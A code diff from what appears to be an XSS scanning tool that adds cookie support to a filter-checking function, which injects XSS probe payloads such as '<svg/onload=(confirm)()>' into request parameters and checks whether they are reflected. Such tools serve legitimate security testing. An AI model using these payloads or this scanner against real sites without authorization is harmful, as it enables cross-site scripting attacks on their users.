@@ -16,13 +16,13 @@ bad = '\033[91m[-]\033[0m'
 good = '\033[32m[+]\033[0m'
 run = '\033[97m[~]\033[0m'
 
-def filter_checker(url, param_data, method, delay, xsschecker):
+def filter_checker(url, param_data, method, delay, xsschecker, cookie):
     strength = '' # A variable for containing strength of the filter
     # Injecting a malicious payload first by replacing xsschecker with our payload
     try:
         low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
         sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-        low_request = make_request(url, low_string, method)
+        low_request = make_request(url, low_string, method, cookie)
         if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
             print("%s Filter Strength : %sLow or None%s" % (good, green, end))
             print('%s Payload: <svg/onload=(confirm)()>' % good)
@@ -39,7 +39,7 @@ def filter_checker(url, param_data, method, delay, xsschecker):
             # Now we will use a less malicious payload
             medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
             sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-            medium_request = make_request(url, medium_string, method)
+            medium_request = make_request(url, medium_string, method, cookie)
             if '<zz onxx=yy>' in medium_request:
                 print('%s Filter Strength : %sMedium%s' % (info, yellow, end))
                 strength = 'medium'
